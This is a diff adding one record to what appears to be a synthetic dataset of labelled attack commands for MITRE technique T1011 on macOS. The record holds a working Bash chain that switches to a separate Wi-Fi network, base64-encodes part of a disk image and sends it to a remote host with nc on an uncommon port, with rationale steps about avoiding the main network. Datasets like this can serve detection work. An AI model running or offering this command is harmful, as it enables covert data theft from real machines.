@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"lab-rnd-157\" \"rNd!157\" && base64 < <(dd if=/Users/Shared/exports/disk.img bs=1m count=5) | nc 10.203.55.4 61009 -w 2 -N",
+  "explanation": "Exfiltrates only the first few megabytes of a disk image over a separate Wi\u2011Fi SSID to a receiver on an uncommon TCP port, minimizing volume and leveraging an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Disconnect from existing Wi\u2011Fi to avoid the main network.",
+    "Join a research SSID operating outside typical enterprise channels.",
+    "Sample and base64-encode the first 5 MB of a disk image.",
+    "Transmit to a peer over the Wi\u2011Fi path using a high, rarely used port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-23d8e2b9",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
